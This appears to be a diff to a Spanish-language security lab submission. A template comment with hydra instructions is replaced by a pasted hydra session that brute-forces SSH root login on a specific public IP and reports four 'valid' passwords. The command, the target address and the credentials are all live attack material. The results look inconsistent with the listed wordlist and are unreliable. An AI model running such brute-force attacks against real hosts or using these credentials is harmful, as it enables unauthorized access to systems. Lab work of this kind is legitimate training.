@@ -1,8 +1,12 @@
-# PEGAR AQUÍ el resultado de hydra
-# Comando en máquina atacante:
-#   echo -e "admin\nroot\n123456\npassword\ntest" > /tmp/passwords.txt
-#   hydra -l root -P /tmp/passwords.txt -t 4 -s 22 -o /tmp/hydra_result.txt ssh://<IP_VPS>
-#   cat /tmp/hydra_result.txt
-#
-# Borrar este comentario y pegar la salida a continuación:
+pau@User0:~$ hydra -l root -P /tmp/passwords.txt -t 4 -s 22   -o /tmp/hydra_result.txt ssh://75.119.137.109
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-02 15:34:01
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
+[DATA] attacking ssh://75.119.137.109:22/
+[22][ssh] host: 75.119.137.109   login: root   password: test2
+[22][ssh] host: 75.119.137.109   login: root   password: test
+[22][ssh] host: 75.119.137.109   login: root   password: password
+[22][ssh] host: 75.119.137.109   login: root   password: test3
+1 of 1 target successfully completed, 4 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-02 15:34:02
